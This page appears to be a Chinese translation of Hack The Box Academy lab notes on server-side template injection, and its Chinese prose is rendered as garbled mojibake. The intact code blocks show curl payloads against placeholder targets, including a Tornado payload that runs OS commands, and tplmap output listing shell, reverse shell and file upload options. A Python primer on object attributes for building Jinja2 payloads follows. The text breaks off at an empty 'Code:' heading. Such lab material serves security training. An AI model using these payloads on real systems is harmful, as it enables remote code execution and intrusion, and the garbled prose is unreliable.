<p>æˆ‘ä»¬ä½¿ç”¨çš„æœ‰æ•ˆè´Ÿè½½ï¼ˆä»¥åŠæ›´å¤šï¼‰å¯ä»¥åœ¨[PayloadsAllTheThings - Template Injection](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection#jinja2)å’Œ<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks- SSTIï¼ˆæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰</a>ä¸Šæ‰¾åˆ°</p>
<p>æ—¢ç„¶æ²¡æœ‰ä¸€ç§æ–¹æ³•æ˜¯æ— æ‡ˆå¯å‡»çš„ï¼Œé‚£å°±åº”è¯¥ç›´æˆªäº†å½“äº†ã€‚æˆ‘ä»¬å¯ä»¥ä»ä¸Šé¢æåˆ°çš„èµ„æºä¸­ç¼–è¯‘ä¸€ä¸ªæ¨¡æ¿å¼•æ“ç‰¹å®šçš„æœ‰æ•ˆè´Ÿè½½åˆ—è¡¨ï¼Œå¹¶æ¨¡ç³Šåº”ç”¨ç¨‹åºï¼Œç›´åˆ°æˆ‘ä»¬å¾—å‡ºæ­£åœ¨ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“çš„ç»“è®ºã€‚</p>
<p>æœ€ç»ˆï¼Œå½“æäº¤<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/guide/templates.html">é¾™å·é£</a>ç‰¹å®šçš„æœ‰æ•ˆè½½è·æ—¶ï¼Œæˆ‘ä»¬ä¼šé‡åˆ°ä¸‹é¢çš„æƒ…å†µã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">form {</span><br><span class="line">margin: 0 auto;</span><br><span class="line">width: 200;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 style="text-align: center;"&gt;~ Damn Hackers ~&lt;/h1&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;Gentlemen, we can rebuild it &lt;br /&gt;We have the technology &lt;br /&gt;We have the capability to make the worlds first bionic website&lt;br /&gt;Better than it was before &lt;br /&gt;Better, Stronger, Faster.&lt;/h2&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;&lt;em&gt;Great!&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3 style="text-align: center;"&gt;&lt;em&gt;Email 0 has been subscribed. You&amp;#39;ll hear from us soon!&lt;/em&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>çœ‹æ¥æˆ‘ä»¬ç»ˆäºå¾—åˆ°äº†ï¼Tornadoæ­£åœ¨åç«¯ä½¿ç”¨ã€‚</p>
<p>å¦‚å‰æ‰€è¿°ï¼Œ<code>tplmap</code>å¯ç”¨äºè‡ªåŠ¨åŒ–æ¨¡æ¿å¼•æ“è¯†åˆ«å’Œå¼€å‘è¿‡ç¨‹ã€‚</p>
<h4 id="tplmap-py-1"><a href="#tplmap-py-1" class="headerlink" title="tplmap.py"></a>tplmap.py</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ./tplmap.py -u 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam' -d email=blah</span><br><span class="line"></span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if POST parameter 'email' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '${*}'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Tornado plugin has confirmed injection with tag '{{*}}'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  POST parameter: email</span><br><span class="line">  Engine: Tornado</span><br><span class="line">  Injection: {{*}}</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell				Run shell on the target</span><br><span class="line">    --os-cmd				Execute shell commands</span><br><span class="line">    --bind-shell PORT			Connect to a shell bind to a target port</span><br><span class="line">    --reverse-shell HOST PORT	Send a shell back to the attacker's port</span><br><span class="line">    --upload LOCAL REMOTE	Upload files to the server</span><br><span class="line">    --download REMOTE LOCAL	Download remote files</span><br></pre></td></tr></tbody></table></figure>

<h2 id="SSTI-Exploitation-Example-3"><a href="#SSTI-Exploitation-Example-3" class="headerlink" title="SSTI Exploitation Example 3"></a>SSTI Exploitation Example 3</h2><p>è®©æˆ‘ä»¬çœ‹çœ‹SSTIç³»åˆ—çš„æœ€åä¸€ä¸ªåº”ç”¨ç¨‹åºã€‚å†æ¬¡å¼ºè°ƒï¼Œæˆ‘ä»¬çš„é‡ç‚¹æ˜¯ç¡®å®šåº”ç”¨ç¨‹åºæ˜¯å¦å®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥çš„æ”»å‡»ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/jinja1.png" alt="image"></p>
<p>ç”¨æˆ·è¾“å…¥é€šè¿‡GETè¯·æ±‚é€šè¿‡<code>cmd</code>å‚æ•°æäº¤ã€‚è®©æˆ‘ä»¬åœ¨è¾“å…¥å­—æ®µä¸­çš„èŠ±æ‹¬å·ä¸­æäº¤æ•°å­¦è¡¨è¾¾å¼ï¼Œä¾‹å¦‚åœ¨<code>SSTI Identification</code>éƒ¨åˆ†ä¸­æåˆ°çš„é‚£äº›ï¼Œä»<code>{7*7}</code>å¼€å§‹ã€‚</p>
<h4 id="cURL-Interacting-with-the-Target-10"><a href="#cURL-Interacting-with-the-Target-10" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={7*7}"</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	#command {</span><br><span class="line">		resize: horizontal;</span><br><span class="line">		background-color : transparent;</span><br><span class="line">		border-color: transparent;</span><br><span class="line">		font-size: 15px;</span><br><span class="line">		width: 200px;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">	#command:active {</span><br><span class="line">        width: auto;   </span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset="utf-8"&gt;</span><br><span class="line">    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span><br><span class="line">	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	</span><br><span class="line">	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;</span><br><span class="line">	&lt;title&gt;Windows&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;{7*7}&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class="window" data-title="Windows"&gt;</span><br><span class="line">			&lt;h1&gt;Windows&lt;/h1&gt;</span><br><span class="line">			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span><br><span class="line">			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="taskbar"&gt;		</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="icons"&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span><br><span class="line">		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>çœ‹èµ·æ¥åº”ç”¨ç¨‹åºæ²¡æœ‰è¯„ä¼°æäº¤çš„è¡¨è¾¾å¼ã€‚è®©æˆ‘ä»¬ç»§ç»­å¦ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿™æ¬¡æ˜¯<code>${7*7}</code>ã€‚             </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=${7*7}'</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	#command {</span><br><span class="line">		resize: horizontal;</span><br><span class="line">		background-color : transparent;</span><br><span class="line">		border-color: transparent;</span><br><span class="line">		font-size: 15px;</span><br><span class="line">		width: 200px;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">	#command:active {</span><br><span class="line">        width: auto;   </span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset="utf-8"&gt;</span><br><span class="line">    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span><br><span class="line">	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	</span><br><span class="line">	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;</span><br><span class="line">	&lt;title&gt;Windows&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;${7*7}&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class="window" data-title="Windows"&gt;</span><br><span class="line">			&lt;h1&gt;Windows&lt;/h1&gt;</span><br><span class="line">			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span><br><span class="line">			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="taskbar"&gt;		</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="icons"&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span><br><span class="line">		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>çœ‹èµ·æ¥åº”ç”¨ç¨‹åºä¹Ÿæ²¡æœ‰è®¡ç®—è¿™ä¸ªè¡¨è¾¾å¼ã€‚<code>{{7*7}}</code>æ€ä¹ˆæ ·ï¼Ÿ   </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*7}}"</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	#command {</span><br><span class="line">		resize: horizontal;</span><br><span class="line">		background-color : transparent;</span><br><span class="line">		border-color: transparent;</span><br><span class="line">		font-size: 15px;</span><br><span class="line">		width: 200px;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">	#command:active {</span><br><span class="line">        width: auto;   </span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset="utf-8"&gt;</span><br><span class="line">    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span><br><span class="line">	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	</span><br><span class="line">	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;</span><br><span class="line">	&lt;title&gt;Windows&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;49&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class="window" data-title="Windows"&gt;</span><br><span class="line">			&lt;h1&gt;Windows&lt;/h1&gt;</span><br><span class="line">			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span><br><span class="line">			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="taskbar"&gt;		</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="icons"&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span><br><span class="line">		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>å¹¸è¿çš„æ˜¯ï¼Œè¿™ä¸€æ¬¡ï¼Œåº”ç”¨ç¨‹åºè¯„ä¼°äº†æˆ‘ä»¬æäº¤çš„æœ€æ–°æ•°å­¦è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›äº†ç»“æœ49ã€‚çœ‹èµ·æ¥æˆ‘ä»¬å¯èƒ½æ­£åœ¨å¤„ç†ä¸€ä¸ªSSTIæ¼æ´ï¼</p>
<p>å¦‚å‰æ‰€è¿°ï¼Œåœ¨å¤„ç†SSTIæ¼æ´æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯è¯†åˆ«åº”ç”¨ç¨‹åºæ­£åœ¨ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“ã€‚è®©æˆ‘ä»¬å†æ¬¡åœ¨<code>SSTI Identification</code>ä¸­ä½¿ç”¨PortSwiggerçš„å›¾è¡¨ã€‚æˆ‘ä»¬å·²ç»çŸ¥é“<code>{{7*7}}</code>è¡¨è¾¾å¼è¢«æˆåŠŸåœ°æ±‚å€¼äº†ã€‚å›¾ä¸­å»ºè®®å°è¯•çš„ä¸‹ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯<code>{{7*'7'}}</code>ã€‚è®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹åº”ç”¨ç¨‹åºå¦‚ä½•å“åº”ã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*'7'}}"</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	#command {</span><br><span class="line">		resize: horizontal;</span><br><span class="line">		background-color : transparent;</span><br><span class="line">		border-color: transparent;</span><br><span class="line">		font-size: 15px;</span><br><span class="line">		width: 200px;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">	#command:active {</span><br><span class="line">        width: auto;   </span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset="utf-8"&gt;</span><br><span class="line">    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span><br><span class="line">	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	</span><br><span class="line">	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;</span><br><span class="line">	&lt;title&gt;Windows&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;7777777&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class="window" data-title="Windows"&gt;</span><br><span class="line">			&lt;h1&gt;Windows&lt;/h1&gt;</span><br><span class="line">			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span><br><span class="line">			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="taskbar"&gt;		</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="icons"&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span><br><span class="line">		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>åº”ç”¨ç¨‹åºä¹ŸæˆåŠŸåœ°è®¡ç®—äº†æ­¤è¡¨è¾¾å¼ã€‚æ ¹æ®PortSwiggerçš„å›¾è¡¨ï¼Œæˆ‘ä»¬æ­£åœ¨å¤„ç†Jinja 2æˆ–Twigæ¨¡æ¿å¼•æ“ã€‚ä¹Ÿå°±æ˜¯è¯´,è¿™æ„å‘³ç€Jinja 2æ­£åœ¨åç«¯ä½¿ç”¨ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥è‡ªåŠ¨åŒ–æˆ‘ä»¬åˆšåˆšé€šè¿‡<code>tplmap</code>æ‰§è¡Œçš„æ¨¡æ¿å¼•æ“è¯†åˆ«è¿‡ç¨‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<h4 id="tplmap-py-2"><a href="#tplmap-py-2" class="headerlink" title="tplmap.py"></a>tplmap.py</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ./tplmap.py -u 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd'</span><br><span class="line"></span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if GET parameter 'cmd' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '${*}'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag '{{*}}'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: cmd</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: {{*}}</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell				Run shell on the target</span><br><span class="line">    --os-cmd				Execute shell commands</span><br><span class="line">    --bind-shell PORT			Connect to a shell bind to a target port</span><br><span class="line">    --reverse-shell HOST PORT	Send a shell back to the attacker's port</span><br><span class="line">    --upload LOCAL REMOTE	Upload files to the server</span><br><span class="line">    --download REMOTE LOCAL	Download remote files</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸‹ä¸€æ­¥æ˜¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åœ¨è¿›å…¥æœ‰æ•ˆè´Ÿè½½å¼€å‘éƒ¨åˆ†ä¹‹å‰ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹SSTIçš„ä¸€äº›Pythonã€‚</p>
<h3 id="Python-Primer-for-SSTI"><a href="#Python-Primer-for-SSTI" class="headerlink" title="Python Primer for SSTI"></a>Python Primer for SSTI</h3><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¥è‡ª<a target="_blank" rel="noopener" href="https://www.fatalerrors.org/a/0dhx1Dk.html">fatalerrors.orgçš„</a>å°å­—å…¸ï¼Œåœ¨æµè§ˆæœ¬èŠ‚çš„Jinja 2æœ‰æ•ˆè´Ÿè½½å¼€å‘éƒ¨åˆ†æ—¶å¯ä»¥å‚è€ƒï¼š</p>
<table>
<thead>
<tr>
<th><strong>No.</strong></th>
<th><strong>Methods</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1.</td>
<td><code>__class__</code></td>
<td>è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡ï¼ˆç±»ï¼‰</td>
</tr>
<tr>
<td>2.</td>
<td><code>__mro__</code></td>
<td>è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œè¯¥å…ƒç»„åŒ…å«ç”±å¯¹è±¡ç»§æ‰¿çš„åŸºç±»ã€‚æ–¹æ³•æŒ‰å…ƒç»„çš„é¡ºåºè¿›è¡Œè§£æã€‚</td>
</tr>
<tr>
<td>3.</td>
<td><code>__subclasses__</code> <code>__class__</code></td>
<td>æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™å¯¹å­ç±»çš„å¼•ç”¨ï¼Œæ­¤æ–¹æ³•è¿”å›ç±»ä¸­ä»ç„¶å¯ç”¨çš„å¼•ç”¨åˆ—è¡¨</td>
</tr>
<tr>
<td>4.</td>
<td><code>__builtins__</code></td>
<td>è¿”å›å‡½æ•°ä¸­åŒ…å«çš„å†…ç½®æ–¹æ³•</td>
</tr>
<tr>
<td>5.</td>
<td><code>__globals__</code></td>
<td>å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨</td>
</tr>
<tr>
<td>6.</td>
<td><code>__base__</code></td>
<td>è¿”å›å¯¹è±¡ç»§æ‰¿çš„åŸºç±»&lt;â€“ï¼ˆ__ base__å’Œ__ mro__ç”¨äºæŸ¥æ‰¾åŸºç±»ï¼‰</td>
</tr>
<tr>
<td>7.</td>
<td><code>__init__</code> <code>__class__</code></td>
<td>ç±»åˆå§‹åŒ–æ–¹æ³•</td>
</tr>
</tbody></table>
<p>é¦–å…ˆåœ¨Pwnboxæˆ–æœ¬åœ°VMçš„ç»ˆç«¯ä¸Šè¿è¡ŒPythonï¼Œç„¶åæ²¿ç€åšã€‚</p>
<h4 id="Python-3-Interpreter"><a href="#Python-3-Interpreter" class="headerlink" title="Python 3 Interpreter"></a>Python 3 Interpreter</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ python3</span><br><span class="line"></span><br><span class="line">Python 3.9.2 (default, Feb 28 2021, 17:03:44) </span><br><span class="line">[GCC 10.2.1 20210110] on linux</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></tbody></table></figure>

<p>åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡å¹¶ä½¿ç”¨<code>type</code>å’Œ<code>__class__</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ç„¶åä½¿ç”¨<code>dir()</code>å‘½ä»¤æ˜¾ç¤ºå¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•å’Œå±æ€§ã€‚</p>
<p>Code: </p>
